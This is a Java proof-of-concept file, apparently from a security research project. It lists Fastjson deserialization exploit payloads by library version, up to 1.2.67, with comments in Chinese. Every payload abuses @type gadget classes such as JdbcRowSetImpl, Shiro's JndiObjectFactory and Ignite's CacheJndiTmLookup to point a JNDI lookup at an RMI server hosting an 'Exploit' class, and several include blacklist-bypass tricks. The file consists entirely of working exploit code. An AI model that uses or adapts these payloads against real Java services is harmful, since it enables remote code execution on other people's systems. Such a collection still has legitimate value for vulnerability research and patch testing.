package cc.blbana.FastjsonBypass;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FJBypassPoC {
    /**
     * 构造Json PoC，反序列化漏洞入口文件
     * @param args
     */
    public static void main(String[] args) {
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // <= 1.2.25 加入黑白名单机制前
//        String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false}";
//        JSON.parse(PoC);

        // <= 1.2.41
//        String PoC = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false}";
//        JSON.parse(PoC);

        // <= 1.2.42
//        String PoC = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false}";
//        JSON.parse(PoC);

        // <= 1.2.43
//        String PoC = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,{ \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false}";
//        JSON.parse(PoC);

        // <= 1.2.45
//        String PoC = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}}";
//        JSON.parse(PoC);

        // 1.2.33 <= version <= 1.2.47
//        String PoC = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}}";
//        JSON.parse(PoC);

        // <= 1.2.62
        // ibatis-sqlmap-2.3.4.726.jar
//        String PoC = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"rmi://localhost:1099/Exploit\"}}";
//        JSON.parse(PoC);

        // <= 1.2.67
        // shiro-core-1.5.1.jar
//        String PoC = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"rmi://localhost:1099/Exploit\"}";
//        JSON.parseObject(PoC);

        // <= 1.2.66
        // Anteros-DBCP-1.0.1.jar
//        String PoC = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://localhost:1099/Exploit\"}";
//        JSON.parse(PoC);

        // <= 1.2.67
        String PoC = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"rmi://localhost:1099/Exploit\"}";
        JSON.parseObject(PoC);
    }
}
